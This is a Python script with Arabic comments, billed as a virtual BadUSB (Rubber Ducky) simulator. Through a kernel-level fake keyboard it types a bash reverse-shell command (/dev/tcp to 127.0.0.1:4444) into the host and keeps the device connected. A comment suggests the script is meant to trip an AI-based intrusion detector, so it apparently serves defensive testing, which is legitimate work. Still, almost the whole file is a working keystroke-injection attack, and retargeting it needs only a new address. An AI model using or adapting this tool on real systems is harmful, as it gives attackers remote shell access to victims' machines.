import time
from evdev import UInput, ecodes as e

# 💀 الحمولة الخبيثة (Reverse Shell) التي ستجبر الذكاء الاصطناعي على تفعيل الإعدام
PAYLOAD = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n"

# خريطة مبسطة لتحويل الحروف إلى إشارات كيبورد لنظام لينكس
KEY_MAP = {
    'b': e.KEY_B, 'a': e.KEY_A, 's': e.KEY_S, 'h': e.KEY_H, ' ': e.KEY_SPACE,
    '-': e.KEY_MINUS, 'i': e.KEY_I, '>': [e.KEY_LEFTSHIFT, e.KEY_DOT],
    '&': [e.KEY_LEFTSHIFT, e.KEY_7], '/': e.KEY_SLASH, 'd': e.KEY_D,
    'e': e.KEY_E, 'v': e.KEY_V, 't': e.KEY_T, 'c': e.KEY_C, 'p': e.KEY_P,
    '1': e.KEY_1, '2': e.KEY_2, '7': e.KEY_7, '.': e.KEY_DOT, '0': e.KEY_0,
    '4': e.KEY_4, '\n': e.KEY_ENTER
}

def simulate_badusb():
    print("[💀] Booting Virtual BadUSB (Rubber Ducky Simulator)...")
    time.sleep(2)
    
    try:
        # إنشاء كيبورد وهمي على مستوى النواة
        ui = UInput(name="Virtual-BadUSB-Attacker")
        print("[!] Virtual Keyboard Connected! Injecting payload in 3 seconds...")
        time.sleep(3)
        
        print(f"[🔥] Injecting: {PAYLOAD.strip()}")
        # حقن الحروف بسرعة جنونية (0.02 ثانية بين كل حرف) لمحاكاة الهجوم
        for char in PAYLOAD:
            if char in KEY_MAP:
                keys = KEY_MAP[char]
                if isinstance(keys, list):
                    # للحروف التي تحتاج Shift
                    ui.write(e.EV_KEY, keys[0], 1)
                    ui.write(e.EV_KEY, keys[1], 1)
                    ui.write(e.EV_KEY, keys[1], 0)
                    ui.write(e.EV_KEY, keys[0], 0)
                else:
                    ui.write(e.EV_KEY, keys, 1) # Key Down
                    ui.write(e.EV_KEY, keys, 0) # Key Up
                ui.syn()
                time.sleep(0.02) # سرعة روبوتية خارقة!
                
        # ... بقية الكود فوق كما هو ...
                
        print("[💀] Payload delivered! Holding connection open to simulate real hardware...")
        time.sleep(15)  # ⏳ الفلاشة ستظل موصولة لـ 15 ثانية (هذا هو التعديل)
        
        ui.close()
        print("[💀] Disconnected.")
        
    except Exception as ex:
        print(f"[-] Simulator failed. Need sudo? Error: {ex}")

if __name__ == "__main__":
    simulate_badusb()